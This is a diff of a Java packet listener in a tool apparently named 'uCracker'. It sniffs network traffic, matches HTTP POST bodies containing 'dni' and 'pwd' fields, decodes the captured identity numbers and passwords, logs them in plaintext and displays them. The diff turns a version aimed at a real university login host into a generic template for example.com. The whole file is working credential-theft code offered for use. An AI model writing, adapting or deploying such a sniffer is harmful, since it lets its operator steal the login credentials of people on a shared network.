@@ -10,15 +10,16 @@ import org.apache.log4j.Logger;
 import org.uCracker.util.ArgsPresentator;
 import org.uCracker.util.uCrackerPacketListener;
 
-public class ITBAPacketListener implements uCrackerPacketListener{
+public class ExamplePacketListener implements uCrackerPacketListener{
 	
-	private static final Logger LOG = Logger.getLogger(ITBAPacketListener.class);
+	private static final Logger LOG = Logger.getLogger(ExamplePacketListener.class);
 
-	private static final String IOL_POST_DATA_PATTERN = "dni=.*&pwd=.*(&.*)*";
+	private static final String EXAMPLE_HOST = "example.com";
+	private static final String EXAMPLE_CREDENTIAL_PATTERN = "dni=.*&pwd=.*(&.*)*";
 	
 	private ArgsPresentator argsPresentator;
 	
-	public ITBAPacketListener(ArgsPresentator argsPresentator) {
+	public ExamplePacketListener(ArgsPresentator argsPresentator) {
 		this.argsPresentator = argsPresentator;
 	}
 
@@ -34,15 +35,19 @@ public class ITBAPacketListener implements uCrackerPacketListener{
 				if(isoData.startsWith("POST")){
 					String[] sections = isoData.split("\r\n\r\n");
 					if(sections.length >= 2){
-						if( Pattern.matches(IOL_POST_DATA_PATTERN, sections[1]) ){
+						if( Pattern.matches(EXAMPLE_CREDENTIAL_PATTERN, sections[1]) ){
+							
 							String dni, pwd;
 							String[] parameters = sections[1].split("&");
 							dni = parameters[0].substring(parameters[0].indexOf("=") + 1, parameters[0].length());
 							pwd = parameters[1].substring(parameters[1].indexOf("=") + 1, parameters[1].length());
 							dni = URLDecoder.decode(dni, "UTF-8");
 							pwd = URLDecoder.decode(pwd, "UTF-8");
+							
+							//OPTIONAL and RECOMENDED logging
 							LOG.trace("> dni:'" + dni + "' - pwd:'" + pwd + "'");
-							argsPresentator.display(dni, pwd);
+							
+							argsPresentator.display(dni, pwd, this.getHost());
 						}
 					}
 				}
@@ -53,6 +58,6 @@ public class ITBAPacketListener implements uCrackerPacketListener{
 	}
 
 	public String getHost() {
-		return "itba.edu.ar";
+		return EXAMPLE_HOST;
 	}
 }
